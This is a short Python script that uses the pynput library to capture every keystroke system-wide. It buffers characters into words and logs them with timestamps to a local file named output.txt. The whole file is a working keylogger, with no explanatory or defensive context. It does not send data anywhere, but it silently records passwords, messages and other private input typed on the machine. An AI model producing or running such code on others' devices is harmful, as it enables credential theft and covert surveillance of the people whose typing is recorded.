from pynput.keyboard import Key, Listener
import logging

logging.basicConfig(filename="output.txt", level=logging.DEBUG, format="%(asctime)s - %(message)s")

pressed_keys = []
allowed_special_characters = set("!@#$%^&*()_+-=[]{}|;:'\",.<>?")

def on_press(key):
    try:
        key = str(key.char)

        if key == 'None': return
        
        if key.isalnum() or key in allowed_special_characters:
            pressed_keys.append(key)

    except AttributeError:
        if not pressed_keys: return

        if key == Key.space or key == Key.enter:
            logging.info("".join(pressed_keys))
            pressed_keys.clear()

        if key == Key.backspace:
            pressed_keys.pop()

with Listener(on_press=on_press) as listener:
    listener.join()
